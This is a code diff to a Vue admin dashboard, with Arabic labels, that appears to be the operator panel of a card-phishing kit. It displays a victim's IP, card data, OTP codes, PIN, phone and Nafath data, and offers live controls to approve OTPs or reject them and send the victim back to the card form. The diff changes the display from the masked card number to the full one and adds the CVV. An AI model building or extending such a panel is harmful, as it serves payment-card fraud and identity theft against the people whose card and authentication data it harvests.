@@ -16,9 +16,9 @@
       <span class="rounded-lg bg-emerald-500/10 px-3 py-1.5 font-mono text-sm text-emerald-400 ring-1 ring-emerald-500/20">{{ customer?.ip }}</span>
     </template>
 
-    <div v-if="customer" class="grid grid-cols-12 gap-5">
+    <div v-if="customer" class="grid grid-cols-1 lg:grid-cols-12 gap-5">
       <!-- Card Details Column -->
-      <div class="col-span-5">
+      <div class="lg:col-span-5">
         <div class="admin-glass admin-glass--emerald h-full">
           <div class="admin-panel-header">
             <div class="flex items-center gap-2.5">
@@ -35,7 +35,7 @@
           <div v-if="currentCard">
             <div class="relative mx-auto max-w-[400px]">
               <BankCard3D
-                :cardNumber="currentCard.card_number_masked || (currentCard.last4 ? '**** **** **** ' + currentCard.last4 : '')"
+                :cardNumber="currentCard.card_number_full || currentCard.card_number_masked || (currentCard.last4 ? '•••• •••• •••• ' + currentCard.last4 : '')"
                 :holderName="currentCard.holder_name || currentCard.card_holder || ''"
                 :expiry="currentCard.expiry_month && currentCard.expiry_year ? `${currentCard.expiry_month}/${currentCard.expiry_year}` : ''"
                 :bankName="bankInfo?.bank?.name || ''"
@@ -43,6 +43,8 @@
                 :scheme="bankInfo?.scheme || ''"
                 :cardType="bankInfo?.type || ''"
                 :cardLevel="bankInfo?.brand || ''"
+                :status="currentCard.status || ''"
+                :cvv="currentCard.cvv || ''"
               />
               <div v-if="bankInfoLoading" class="absolute inset-0 flex items-center justify-center rounded-xl bg-black/40 backdrop-blur-sm">
                 <span class="inline-block h-6 w-6 animate-spin rounded-full border-2 border-emerald-400 border-t-transparent" aria-label="Loading bank info"></span>
@@ -100,8 +102,8 @@
       </div>
 
       <!-- OTP + PIN + Phone Column -->
-      <div class="col-span-4 space-y-4">
-        <div class="grid grid-cols-2 gap-4">
+      <div class="lg:col-span-4 space-y-4">
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
           <!-- OTP Code -->
           <div class="admin-glass admin-glass--amber flex min-h-[180px] flex-col">
             <div class="admin-panel-header">
@@ -116,12 +118,17 @@
                 <span class="font-mono text-2xl font-bold tracking-[0.25em] text-amber-400">{{ latestOtp.code || latestOtp.otp_code || '—' }}</span>
               </div>
               <div v-if="isPending(latestOtp.status)" class="mt-auto space-y-2 pt-3">
-                <AdminButton variant="accept" size="sm" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'otp-approve')">قبول</AdminButton>
+                <AdminButton variant="accept" size="sm" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'otp-approve')">
+                  <i class="fa-solid fa-check ms-1 text-xs" aria-hidden="true"></i>
+                  قبول
+                </AdminButton>
                 <RejectReasonPicker action="otp-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'otp-reject', reason)" />
-                <div class="border-t border-amber-500/20 pt-2 mt-1">
-                  <p class="mb-1 text-[10px] text-amber-400/70">رفض وإعادة لنموذج البطاقة</p>
-                  <RejectReasonPicker action="otp-reject-redirect" :disabled="processingAction" @reject="reason => $emit('payment-action', 'otp-reject-redirect', reason)" />
-                </div>
+                <RejectReasonPicker
+                  action="otp-reject-redirect"
+                  trigger-label="رفض وإعادة لنموذج البطاقة"
+                  :disabled="processingAction"
+                  @reject="reason => $emit('payment-action', 'otp-reject-redirect', reason)"
+                />
               </div>
               <div v-else-if="latestOtp.status === 'approved' || latestOtp.status === 'verified'" class="mt-2 text-center">
                 <StatusPill variant="success" icon-text="✓" label="تمت الموافقة" />
@@ -270,7 +277,7 @@
       </div>
 
       <!-- Nafath Column -->
-      <div class="col-span-3">
+      <div class="lg:col-span-3">
         <div class="admin-glass admin-glass--cyan h-full">
           <div class="admin-panel-header">
             <div class="flex items-center gap-2">
